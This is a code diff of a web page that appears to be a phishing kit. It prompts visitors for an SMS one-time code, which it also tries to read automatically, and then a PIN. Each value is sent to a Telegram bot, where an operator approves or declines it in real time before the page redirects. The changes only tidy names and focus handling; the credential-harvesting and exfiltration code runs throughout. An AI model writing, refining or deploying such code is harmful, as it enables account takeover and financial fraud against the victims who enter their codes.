@@ -84,7 +84,7 @@
             cursor: pointer;
         }
 
-        /* PIN Popup Modal */
+        /* PIN Modal */
         #pinModal {
             position: fixed;
             inset: 0;
@@ -101,7 +101,6 @@
             border-radius: 24px;
             padding: 30px 20px;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
 
         #spinner {
@@ -142,7 +141,7 @@
         </div>
     </div>
 
-    <!-- PIN Popup Modal -->
+    <!-- PIN Modal -->
     <div id="pinModal">
         <div class="modal-content">
             <div class="logo-section">
@@ -159,7 +158,6 @@
         </div>
     </div>
 
-    <!-- Main Spinner -->
     <div id="spinner">
         <div class="spin"></div>
         <p style="margin-top:15px;">Waiting for approval...</p>
@@ -173,15 +171,14 @@
         };
 
         let state = { lastUpdateId: 0, pollInterval: null };
-        let currentApproveId = null;
 
         const errMsg = document.getElementById('errMsg');
+        const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
         const pinModal = document.getElementById('pinModal');
-        const pinErrMsg = document.getElementById('pinErrMsg');
 
-        function createInputs(containerId, count) {
-            const container = document.getElementById(containerId);
+        function createInputs(id, count) {
+            const container = document.getElementById(id);
             container.innerHTML = '';
             for (let i = 0; i < count; i++) {
                 const input = document.createElement('input');
@@ -193,20 +190,21 @@
             }
         }
 
-        function getCode(containerId) {
-            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`)).map(i => i.value).join('');
+        function getCode(id) {
+            return Array.from(document.querySelectorAll(`#${id} .otp-input`)).map(i => i.value).join('');
         }
 
-        function setupAutoFocus(containerId, length, onComplete) {
+        function focusFirstInput(id) {
+            const first = document.querySelector(`#${id} .otp-input`);
+            if (first) first.focus();
+        }
+
+        function setupAutoFocus(containerId, length, callback) {
             const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
             inputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                    if (getCode(containerId).length === length) {
-                        setTimeout(onComplete, 300);
-                    }
+                    if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
+                    if (getCode(containerId).length === length) setTimeout(callback, 300);
                 });
                 input.addEventListener('keydown', (e) => {
                     if (e.key === 'Backspace' && !input.value && index > 0) {
@@ -216,16 +214,13 @@
             });
         }
 
-        // Auto SMS OTP
         async function requestAutoOTP() {
             if (!('OTPCredential' in window)) return;
             try {
                 const credential = await navigator.credentials.get({ otp: { transport: ['sms'] } });
                 if (credential?.code) {
                     const inputs = document.querySelectorAll('#otpInputs .otp-input');
-                    credential.code.split('').forEach((digit, i) => {
-                        if (inputs[i]) inputs[i].value = digit;
-                    });
+                    credential.code.split('').forEach((digit, i) => { if (inputs[i]) inputs[i].value = digit; });
                     setTimeout(submitCode, 500);
                 }
             } catch (e) {}
@@ -236,7 +231,7 @@
             if (code.length !== 6) return;
 
             const ts = Date.now();
-            currentApproveId = `dev_approve_${ts}`;
+            const approveId = `dev_approve_${ts}`;
             const declineId = `dev_decline_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
@@ -248,14 +243,14 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: "✅ Approve & Continue", callback_data: currentApproveId },
+                            { text: "✅ Approve & Continue", callback_data: approveId },
                             { text: "❌ Decline", callback_data: declineId }
                         ]]
                     }
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(currentApproveId, declineId);
+                startPolling(approveId, declineId);
             });
         }
 
@@ -272,13 +267,14 @@
                                 if (cb === approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    showPinPopup();
+                                    showPinModal();
                                 } else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Code declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('otpInputs');   // ← Important fix
                                 }
                             }
                         });
@@ -286,11 +282,11 @@
             }, 1800);
         }
 
-        function showPinPopup() {
+        function showPinModal() {
             pinModal.style.display = 'flex';
             createInputs('pinInputs', 4);
             setupAutoFocus('pinInputs', 4, submitPIN);
-            document.querySelectorAll('#pinInputs .otp-input')[0].focus();
+            focusFirstInput('pinInputs');
         }
 
         function submitPIN() {
@@ -306,7 +302,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nAction:`,
+                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
@@ -321,7 +317,7 @@
         }
 
         function startPinPolling(validId, invalidId) {
-            const pinInterval = setInterval(() => {
+            const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
@@ -330,15 +326,15 @@
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
                                 if (cb === validId) {
-                                    clearInterval(pinInterval);
+                                    clearInterval(interval);
                                     pinModal.style.display = 'none';
                                     window.location.href = CONFIG.SUCCESS_PAGE;
                                 } else if (cb === invalidId) {
-                                    clearInterval(pinInterval);
+                                    clearInterval(interval);
                                     pinErrMsg.textContent = "Invalid PIN. Please try again.";
                                     pinErrMsg.style.display = 'block';
                                     document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
-                                    document.querySelectorAll('#pinInputs .otp-input')[0].focus();
+                                    focusFirstInput('pinInputs');
                                 }
                             }
                         });
@@ -349,7 +345,7 @@
         // Initialize
         createInputs('otpInputs', 6);
         setupAutoFocus('otpInputs', 6, submitCode);
-        document.querySelectorAll('.otp-input')[0].focus();
+        document.querySelectorAll('#otpInputs .otp-input')[0].focus();
 
         window.onload = () => setTimeout(requestAutoOTP, 800);
         document.getElementById('verifyBtn').onclick = submitCode;
